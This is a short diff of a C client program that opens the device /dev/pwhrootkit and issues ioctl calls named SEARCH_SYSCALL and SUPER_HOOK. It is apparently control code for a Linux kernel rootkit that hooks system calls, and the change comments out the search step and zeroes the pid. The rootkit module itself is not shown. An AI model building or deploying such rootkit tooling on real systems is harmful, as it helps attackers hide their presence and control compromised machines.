@@ -14,17 +14,17 @@ struct user_args{
 int main(int argc, char ** argv){
     int fd;
     int opt;
-    pid_t pid;
+    pid_t pid = 0;
 
     fd = open("/dev/pwhrootkit", O_RDONLY);
     if(fd < 0){
         perror("open");
         return -1;
     }
-    if(ioctl(fd, SEARCH_SYSCALL, pid)){
-        perror("ioctl");
-        return -1;
-    }
+    // if(ioctl(fd, SEARCH_SYSCALL, pid)){
+    //     perror("ioctl");
+    //     return -1;
+    // }
     if(ioctl(fd, SUPER_HOOK, pid)){
         perror("ioctl");
         return -1;
